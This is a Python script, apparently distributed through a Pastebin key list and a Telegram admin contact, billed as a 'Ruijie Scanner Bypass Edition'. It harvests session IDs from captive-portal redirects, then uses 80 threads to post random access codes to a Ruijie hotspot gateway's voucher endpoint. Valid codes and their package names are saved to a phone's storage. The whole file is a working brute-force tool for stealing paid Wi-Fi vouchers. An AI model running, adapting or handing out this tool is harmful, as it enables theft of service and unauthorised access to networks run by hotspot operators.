import requests
import random
import string
import time
import os
import threading
import re
import sys
import urllib3
import json
import hashlib
import platform
import getpass
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==============================
# KEY SYSTEM CONFIGURATION (NEW)
# ==============================
ADMIN_PASTEBIN_URL = "https://pastebin.com/raw/ujGt9Buh" 
ADMIN_CONTACT = "https://t.me/catx94"

# ==============================
# UI & COLORS
# ==============================
bcyan = "\033[1;36m"
reset = "\033[00m"
white = "\033[0;37m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
yellow = "\033[0;33m"

# ==============================
# CONFIGURATION
# ==============================
NUM_THREADS = 80             
SESSION_POOL_SIZE = 30       
PER_SESSION_MAX = 200        
SAVE_PATH = "/storage/emulated/0/zapya/valid_codes.txt"

# GLOBALS
session_pool = Queue()
valid_codes = [] 
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_TRIED = 0
TOTAL_HITS = 0
CURRENT_CODE = ""
START_TIME = time.time()
stop_event = threading.Event()
SCAN_MODE = "" 

WAVE_FRAMES = [" ▂▃▄▅▆▇▆▅▄▃ ", "▃▄▅▆▇▆▅▄▃▂ ", "▄▅▆▇▆▅▄▃▂  ", "▅▆▇▆▅▄▃▂   ", "▆▇▆▅▄▃▂    ", "▇▆▅▄▃▂    ▂", "▆▅▄▃▂    ▂▃", "▅▄▃▂    ▂▃▄"]

def generate_static_key():
    info = f"{getpass.getuser()}-{platform.node()}-{platform.processor()}"
    key = hashlib.sha256(info.encode()).hexdigest()[:16].upper()
    return f"SMNS-{key}"

def check_approval(user_key):
    try:
        r = requests.get(ADMIN_PASTEBIN_URL, timeout=10)
        if r.status_code == 200:
            lines = r.text.splitlines()
            for line in lines:
                if "|" in line:
                    app_key, exp_date = line.split("|")
                    if app_key.strip() == user_key:
                        today = datetime.now().date()
                        exp = datetime.strptime(exp_date.strip(), "%Y-%m-%d").date()
                        if today <= exp:
                            return True, exp_date.strip()
                        else:
                            return False, "EXPIRED"
        return False, "NOT_APPROVED"
    except:
        return False, "CONNECTION_ERROR"

def login_screen():
    os.system('clear' if os.name == 'posix' else 'cls')
    u_key = generate_static_key()
    try: term_width = os.get_terminal_size().columns
    except: term_width = 50
    print(f"{bcyan}")
    print(" ██████  ███    ███ ███    ██ ███████ ".center(term_width))
    print("██       ████  ████ ████   ██ ██      ".center(term_width))
    print("   ████  ██ ████ ██ ██ ██  ██ ███████ ".center(term_width))
    print("      ██ ██  ██  ██ ██  ██ ██      ██ ".center(term_width))
    print(" ██████  ██      ██ ██   ████ ███████ ".center(term_width))
    print(f"{white}Ruijie Scanner Security System".center(term_width))
    print(f"{bcyan}" + "═" * term_width + f"{reset}")
    print(f"\n{yellow} [!] YOUR UNIQUE KEY : {white}{u_key}")
    print(f"{yellow} [!] STATUS         : {bcyan}VERIFYING...{reset}")
    ok, status = check_approval(u_key)
    if ok:
        print(f"{bgreen} [✓] ACCESS GRANTED! (Expires: {status}){reset}")
        time.sleep(2)
        return True
    else:
        print(f"{bred} [X] ACCESS DENIED: {status}{reset}")
        print(f"\n{white} Please send your key to Admin to get approval.")
        print(f"{bcyan} Admin Contact : {white}{ADMIN_CONTACT}")
        print(f"{bcyan} Your Key      : {white}{u_key}{reset}")
        sys.exit()

def get_sid_from_gateway():
    global DETECTED_BASE_URL
    s = requests.Session()
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    try:
        r1 = s.get(test_url, allow_redirects=True, timeout=4)
        path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
        final_url = urljoin(r1.url, path_match.group(1)) if path_match else r1.url
        if path_match:
            r2 = s.get(final_url, timeout=4)
            final_url = r2.url
        parsed = urlparse(final_url)
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        sid = parse_qs(parsed.query).get('sessionId', [None])[0]
        return sid
    except: return None

def session_refiller():
    while not stop_event.is_set():
        try:
            if session_pool.qsize() < SESSION_POOL_SIZE:
                sid = get_sid_from_gateway()
                if sid:
                    session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
            time.sleep(0.5)
        except: time.sleep(2)

def worker_thread(mode):
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    headers = {'Content-Type': 'application/json', 'Connection': 'keep-alive'}
    alphanumeric = string.ascii_lowercase + string.digits
    if mode == "1": char_set, code_len = string.digits, 6
    elif mode == "2": char_set, code_len = string.digits, 7
    elif mode == "3": char_set, code_len = string.digits, 8
    elif mode == "4": char_set, code_len = string.ascii_lowercase, 6
    elif mode == "5": char_set, code_len = string.ascii_lowercase, 7
    elif mode == "6": char_set, code_len = string.ascii_lowercase, 8
    elif mode == "7": char_set, code_len = alphanumeric, 7
    elif mode == "8": char_set, code_len = alphanumeric, 8
    elif mode == "9": char_set, code_len = alphanumeric, 9

    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=1)
            except Empty: continue
            sid = slot.get('sessionId')
            code = ''.join(random.choices(char_set, k=code_len))
            CURRENT_CODE = code
            r = thr_session.post(f"{DETECTED_BASE_URL}/api/auth/voucher/", 
                                 json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, 
                                 headers=headers, timeout=5)
            TOTAL_TRIED += 1
            if r.status_code == 200:
                try:
                    res_data = r.json()
                    if res_data.get("success") == True:
                        data = res_data.get("data", {}).get("package_name") or "Valid"
                        with valid_lock:
                            if code not in [c[0] for c in valid_codes]:
                                valid_codes.append((code, data))
                                TOTAL_HITS += 1
                                save_locally(code, sid, data)
                except: pass
            if "invalid" not in r.text.lower() and r.status_code not in (401, 403):
                slot['left'] -= 1
                if slot['left'] > 0: session_pool.put(slot)
        except: pass

def save_locally(code, sid, pkg):
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
        with file_lock:
            with open(SAVE_PATH, "a") as f: 
                f.write(f"{ts} | {code} | {pkg} | SID: {sid}\n")
    except: pass

def live_dashboard():
    frame_idx = 0
    while not stop_event.is_set():
        try: term_width = os.get_terminal_size().columns
        except: term_width = 50
        os.system('clear' if os.name == 'posix' else 'cls')
        elapsed = time.time() - START_TIME
        speed = TOTAL_TRIED / elapsed if elapsed > 0 else 0
        print(f"{bcyan}")
        print(" ██████  ███    ███ ███    ██ ███████ ".center(term_width))
        print("██       ████  ████ ████   ██ ██      ".center(term_width))
        print("   ████  ██ ████ ██ ██ ██  ██ ███████ ".center(term_width))
        print("      ██ ██  ██  ██ ██  ██ ██      ██ ".center(term_width))
        print(" ██████  ██      ██ ██   ████ ███████ ".center(term_width))
        print(f"{white}Ruijie Extreme Speed Scanner".center(term_width))
        modes = {"1": "6-NUM", "2": "7-NUM", "3": "8-NUM", "4": "6-ALPHA", "5": "7-ALPHA", "6": "8-ALPHA", "7": "7-ALNUM", "8": "8-ALNUM", "9": "9-ALNUM"}
        mode_text = modes.get(SCAN_MODE, "UNKNOWN")
        print(f"{bgreen}MODE: {mode_text}{reset}".center(term_width + 10))
        print(f"{bcyan}" + "═" * term_width + f"{reset}")
        print(f" [BASE URL] : {DETECTED_BASE_URL}")
        print(f" [THREADS]  : {NUM_THREADS} active | [SESSIONS]: {session_pool.qsize()}")
        print("-" * term_width)
        print(f" [TOTAL TRIED] : {TOTAL_TRIED:,}")
        print(f" [FOUND HITS]  : {bgreen}{TOTAL_HITS}{reset}")
        print(f" [LIVE SPEED]  : {yellow}{speed:.1f} codes/sec{reset}")
        print(f" [LAST CODE]   : {CURRENT_CODE}")
        print("-" * term_width)
        print(f" {bgreen}[SUCCESS CODES & PACKAGE]{reset}")
        with valid_lock:
            if not valid_codes:
                wave = WAVE_FRAMES[frame_idx % len(WAVE_FRAMES)]
                print(f"  {bcyan}{wave} {white}SCANNING NETWORK... {bcyan}{wave}{reset}")
                frame_idx += 1
            else:
                for c, pkg in valid_codes[-5:]: 
                    print(f"  {bgreen}[ ⚡ ] {white}STATUS: {bgreen}AI_MATCH_FOUND {white}| CODE: {bgreen}{c} {yellow}[{pkg}]{reset}")
        print("-" * term_width)
        print(f"{bred} [!] PRESS CTRL+C TO STOP SCANNING{reset}")
        time.sleep(0.3)

def show_menu():
    global SCAN_MODE, TOTAL_TRIED, TOTAL_HITS, START_TIME, CURRENT_CODE, valid_codes
    stop_event.clear()
    try: term_width = os.get_terminal_size().columns
    except: term_width = 50
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}")
    print(" ██████  ███    ███ ███    ██ ███████ ".center(term_width))
    print("██       ████  ████ ████   ██ ██      ".center(term_width))
    print("   ████  ██ ████ ██ ██ ██  ██ ███████ ".center(term_width))
    print("      ██ ██  ██  ██ ██  ██ ██      ██ ".center(term_width))
    print(" ██████  ██      ██ ██   ████ ███████ ".center(term_width))
    print(f"{white}Ruijie Scanner Bypass Edition".center(term_width))
    print(f"{bcyan}" + "═" * term_width + f"{reset}")
    print(f"\n{yellow}[SELECT SCAN MODE]{reset}")
    print(f"{white} 1. 6-Digit Numeric (0-9)")
    print(f" 2. 7-Digit Numeric (0-9)")
    print(f" 3. 8-Digit Numeric (0-9)")
    print(f" 4. 6-Char Alphabetic (a-z)")
    print(f" 5. 7-Char Alphabetic (a-z)")
    print(f" 6. 8-Char Alphabetic (a-z)")
    print(f" 7. 7-Char Alphanumeric (a-z + 0-9)")
    print(f" 8. 8-Char Alphanumeric (a-z + 0-9)")
    print(f" 9. 9-Char Alphanumeric (a-z + 0-9)")
    print(f" 0. Exit System{reset}")
    choice = input(f"\n{bcyan}Enter Choice: {reset}").strip()
    if choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
        SCAN_MODE = choice
        TOTAL_TRIED, TOTAL_HITS = 0, 0
        START_TIME = time.time()
        CURRENT_CODE = ""
        valid_codes = []
        return True
    elif choice == '0': sys.exit()
    else: return show_menu()

# --- ဒီအပိုင်းက Run.py ကနေ လှမ်းခေါ်ရမယ့် Main Function ပါ ---
def main_run():
    if login_screen():
        while True:
            if show_menu():
                try:
                    while not session_pool.empty():
                        try: session_pool.get_nowait()
                        except: break
                    threading.Thread(target=session_refiller, daemon=True).start()
                    threading.Thread(target=live_dashboard, daemon=True).start()
                    for _ in range(NUM_THREADS):
                        threading.Thread(target=worker_thread, args=(SCAN_MODE,), daemon=True).start()
                    while not stop_event.is_set():
                        time.sleep(1)
                except KeyboardInterrupt:
                    stop_event.set()
                    print(f"\n{yellow}[!] Cleaning up and returning to Menu...{reset}")
                    time.sleep(2)
